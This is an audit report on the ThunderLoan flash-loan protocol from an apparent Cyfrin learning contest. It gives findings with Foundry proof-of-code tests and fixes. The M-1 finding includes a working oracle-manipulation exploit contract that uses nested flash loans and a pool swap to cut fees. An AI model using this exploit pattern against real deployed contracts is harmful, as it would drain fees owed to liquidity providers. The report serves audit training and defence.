![](../logo.png)
![](../img/thunder-loan.png)

# Security Report for the ThunderLoan CodeHawks FirstFlight Contest **learning*

**Source:** https://github.com/Cyfrin/2023-11-Thunder-Loan

## High Issues

### [H-1] `AssetToken::updateExchangeRate()` is erroneously implemented in `ThunderLoan::deposit()` function, causing the protocol to think it has more fees than it does, and further blocking redemptions as well as incorrectly setting the exchange rate

**Description:**

In the `ThunderLoan` system, the `exchangeRate` is responsible for calculating the exchange rate between *assetTokens* and *underlying tokens*. In a way, it is responsible for keeping track of how many fees to give to liquidity providers.

However the `deposit()` function updates the rate without collecting any fees!

```solidity
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

-->     uint256 calculatedFee = getCalculatedFee(token, amount);
-->     assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact:** 

1. The `ThunderLoan::redeem()` function is blocked because the protocol thinks the owed tokens is more than it has
2. Rewards are incorrectly calculated, thus *liquidity providers (LP)* will potentially get way more or less than deserved

**Proof of Concept:**

1. LP deposits
2. User takes out a flash loan
3. It is now impossible for LP to redeem

<details><summary>Proof of Code</summary>

Place the following test into `ThunderLoanTest.t.sol`

```solidity
    function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
    }
```

</details> 

**Recommended Mitigation:** 

Remove the incorrectly updated exchange rate lines from `deposit()` function

```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

### [H-2] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashloanFee` and `ThunderLoan::s_currentlyFlashLoaning`

**Description:**

`ThunderLoan.sol` has two variables in the following order:

```solidity
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee; // 0.3% ETH fee
```

However, the expected upgrade contract `ThunderLoanUpgraded.sol` has them in a different order:

```solidity
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```

Due to how Solidity storage works, after the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the positions of storage variables when working with upgradeable contracts.

**Impact:**

After upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee. Additionally the `s_currentlyFlashLoaning` mapping will start on the wrong storage slot.

**Proof of Code:**

Add the following test to the `ThunderLoanTest.t.sol` file:

```solidity
    // You'll need to import `ThunderLoanUpgraded` as well
    import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

    function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeTo(address(upgraded));
        uint256 feeAfterUpgrade = thunderLoan.getFee();

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
```

You can also see the storage layout difference by running the following commands:

```bash
    forge inspect ThunderLoan storage
    forge sinspect ThunderLoanUpgraded storage
```

**Recommended Mitigation:**

Do not switch the positions of the storage variables on upgrade, and leave a blank if you're going to replace a storage variable with a constant.    
In `ThunderLoanUpgraded.sol`:

```diff
-    uint256 private s_flashLoanFee; // 0.3% ETH fee
-    uint256 public constant FEE_PRECISION = 1e18;
+    uint256 private s_blank;
+    uint256 private s_flashLoanFee; 
+    uint256 public constant FEE_PRECISION = 1e18;
```



## Medium Issues

### [M-1] Using `TSwap` as price oracle leads to price and oracle manipulation attacks

**Description:** 

The `TSwap` protocol is a ***constant product formula based AMM (automated market maker)***. The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.

**Impact:**

Liquidity providers will earn drastically reduced fees for providing liquidity to the protocol.

**Proof of Concept:**

The following all happens in 1 transaction.

1. User takes a flashloan from `ThunderLoan` for 1000 `tokenA`, and they are charged the original fee `fee1`.      
During the flashloan, they do the following:
   1. Sell 1000 `tokenA`, thus tanking the price
   2. Instead of repaying right away, they take out another flashloan for 1000 `tokenA`
      - Due to the fact of the way `ThunderLoan` calculates price based on the `TSwapPool`, this second loan is way cheaper.

        ```solidity
            function getPriceInWeth(address token) public view returns (uint256) {
                address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
        -->     return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
            }
        ```

2. User repays the first flash loan as well as the second flash loan

<details><summary>Proof of Code</summary>

The setup of this test is quite tricky... you need to check out [this video](https://updraft.cyfrin.io/courses/security/thunder-loan/exploit-oracle-manipulation-thunderloan-poc?lesson_format=video)

```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity 0.8.20;

    import { Test, console } from "forge-std/Test.sol";
    import { ThunderLoanTest, ThunderLoan } from "../unit/ThunderLoanTest.t.sol";
    import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
    import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
    import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
    import { TSwapPool } from "./TSwapPool.sol";
    import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";
    import { PoolFactory } from "./PoolFactory.sol";

    contract ProofOfCodes is ThunderLoanTest {
        function testCanManipuleOracleToIgnoreFees() public {
            thunderLoan = new ThunderLoan();
            tokenA = new ERC20Mock();
            proxy = new ERC1967Proxy(address(thunderLoan), "");

            PoolFactory pf = new PoolFactory();
            pf.createPool(address(tokenA));

            address tswapPool = pf.getPool(address(tokenA));

            // Overwrite the WETH address
            deployCodeTo("ERC20Mock.sol:ERC20Mock", address(TSwapPool(tswapPool).WETH_TOKEN()));
            weth = ERC20Mock(address(TSwapPool(tswapPool).WETH_TOKEN()));

            thunderLoan = ThunderLoan(address(proxy));
            thunderLoan.initialize(address(pf));

            // Fund tswap
            vm.startPrank(liquidityProvider);
            tokenA.mint(liquidityProvider, 100e18);
            tokenA.approve(address(tswapPool), 100e18);
            weth.mint(liquidityProvider, 100e18);
            weth.approve(address(tswapPool), 100e18);
            TSwapPool(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
            vm.stopPrank();

            vm.prank(thunderLoan.owner());
            thunderLoan.setAllowedToken(tokenA, true);

            vm.startPrank(liquidityProvider);
            tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
            tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
            thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
            vm.stopPrank();

            // TSwap has 100 WETH & 100 tokenA
            // ThunderLoan has 1,000 tokenA
            // If we borrow 50 tokenA -> swap it for WETH (tank the price) -> borrow another 50 tokenA (do something) ->
            // repay both
            // We pay drastically lower fees

            // here is how much we'd pay normally
            uint256 calculatedFeeNormal = thunderLoan.getCalculatedFee(tokenA, 100e18);

            uint256 amountToBorrow = 50e18;
            MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(address(tswapPool));
            vm.startPrank(user);
            tokenA.mint(address(flr), AMOUNT);
            tokenA.mint(address(flr), 50e18);
            thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
            vm.stopPrank();

            uint256 calculatedFeeAttack = flr.feeOne() + flr.feeTwo();
            console.log("Normal fee: %s", calculatedFeeNormal);
            console.log("Attack fee: %s", calculatedFeeAttack);
            assert(calculatedFeeAttack < calculatedFeeNormal);
        }
    }

    contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
        bool attacked;
        TSwapPool pool;
        uint256 public feeOne;
        uint256 public feeTwo;

        constructor(address tswapPool) {
            pool = TSwapPool(tswapPool);
        }

        function executeOperation(
            address token,
            uint256 amount,
            uint256 fee,
            address, /* initiator */
            bytes calldata /* params */
        )
            external
            returns (bool)
        {
            if (!attacked) {
                feeOne = fee;
                attacked = true;
                uint256 expected = pool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
                IERC20(token).approve(address(pool), 50e18);
                pool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, expected, block.timestamp);
                IERC20(token).approve(msg.sender, amount + fee);
                IThunderLoan(msg.sender).repay(token, amount + fee);
            } else {
                feeTwo = fee;
                IERC20(token).approve(msg.sender, amount + fee);
                IThunderLoan(msg.sender).repay(token, amount + fee);
            }
            return true;
        }
    }
```

</details>

**Recommended Mitigation:**

Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle.

### [M-2] Centralization risk for trusted owners

**Impact:**

Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

<details><summary>Found Instances (2)</summary>

```solidity
    File: src/protocol/ThunderLoan.sol

    223:     function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {

    261:     function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
```

</details>



## Low Issues

### [L-1] Empty function body - Consider commenting why

<details><summary>Found Instance</summary>

```solidity
    File: src/protocol/ThunderLoan.sol

    261:     function _authorizeUpgrade(address newImplementation) internal override onlyOwner { }
```

</details>

### [L-2] Initializers can be front-run

**Description:**

Initializers could be front-run, allowing an attacker to either set their own values, take ownership of the contract, and in the best case forcing a re-deployment.

<details><summary>Found Instances (6)</summary>

```solidity
    File: src/protocol/OracleUpgradeable.sol

    11:     function __Oracle_init(address poolFactoryAddress) internal onlyInitializing {
```

```solidity
    File: src/protocol/ThunderLoan.sol

    138:     function initialize(address tswapAddress) external initializer {

    138:     function initialize(address tswapAddress) external initializer {

    139:         __Ownable_init();

    140:         __UUPSUpgradeable_init();

    141:         __Oracle_init(tswapAddress);
```

</details>

### [L-3] Missing critical event emissions

**Description:**

When the `ThunderLoan::s_flashLoanFee` is updated, there is no event emitted.

**Recommended Mitigation:**

Emit an eveny when the `ThunderLoan::s_flashLoanFee` is updated

```diff
+   event FlashLoanFeeUpdated(uint256 newFee);
    // bunch of existing code

    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
        if (newFee > s_feePrecision) {
            revert ThunderLoan__BadNewFee();
        }
        s_flashLoanFee = newFee;
+       emit FlashLoanFeeUpdated(newFee);
    }
```



## Informational Issues

### [I-1] Poor test covergae

```bash
    Running tests...
    | File                               | % Lines        | % Statements   | % Branches    | % Funcs        |
    | ---------------------------------- | -------------- | -------------- | ------------- | -------------- |
    | src/protocol/AssetToken.sol        | 70.00% (7/10)  | 76.92% (10/13) | 50.00% (1/2)  | 66.67% (4/6)   |
    | src/protocol/OracleUpgradeable.sol | 100.00% (6/6)  | 100.00% (9/9)  | 100.00% (0/0) | 80.00% (4/5)   |
    | src/protocol/ThunderLoan.sol       | 64.52% (40/62) | 68.35% (54/79) | 37.50% (6/16) | 71.43% (10/14) |
```

**Recommended Mitigation:**

Aim to get test coverage up to over 90% for all files.



## Gas Issues

### [G-1] Using bools for storage incurs overhead

Use `uint256(1)` and `uint256(2)` for true/false to avoid a ***Gwarmacess (100 gas)***, and to avoid ***Gsset (2000 gas)*** when changing from 'false' to 'true', after having been 'true' in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27).

<details><summary>Found Instance</summary>

```solidity
    File: src/protocol/ThunderLoan.sol

    98:     mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;

```
</details>

### [G-2] Using `private` rather than `public` for constants , saves gas

If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606** gas in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.

<details><summary>Found Instances (3)</summary>

```solidity
    File: src/protocol/AssetToken.sol

    25:     uint256 public constant EXCHANGE_RATE_PRECISION = 1e18;
```

```solidity
    File: src/protocol/ThunderLoan.sol

    95:     uint256 public constant FLASH_LOAN_FEE = 3e15; // 0.3% ETH fee

    96:     uint256 public constant FEE_PRECISION = 1e18;
```

</details>

### [G-3] Unnecessary SLOAD when logging new exchange rate

In `AssetToken::updateExchangeRate()` function, after writing the `newExchangeRate` to storage, the function reads the value from storage again to log it into the `ExchangeRateUpdated()` event.

To avoid the unnecessary SLOAD, you can log the value of `newExchangeRate`:

```diff
    s_exchangeRate = newExchangeRate;
-   emit ExchangeRateUpdated(s_exchangeRate);
+   emit ExchangeRateUpdated(newExchangeRate);
```
